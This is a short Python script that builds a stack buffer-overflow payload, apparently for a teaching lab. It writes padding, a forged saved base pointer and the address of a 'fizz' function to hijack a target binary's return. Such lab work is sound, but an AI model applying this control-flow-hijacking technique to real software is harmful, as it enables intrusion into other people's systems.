import sys

fizz_addr = 0x401206
cookie_addr = 0x404030

RBP_addr = cookie_addr + 4

payload = b'A' * 32
payload += RBP_addr.to_bytes(8, byteorder='little')
payload += fizz_addr.to_bytes(8, byteorder='little')

with open(r'./payload/fizz.bin', 'wb') as f:
    f.write(payload)

print("Payload written to payload.bin")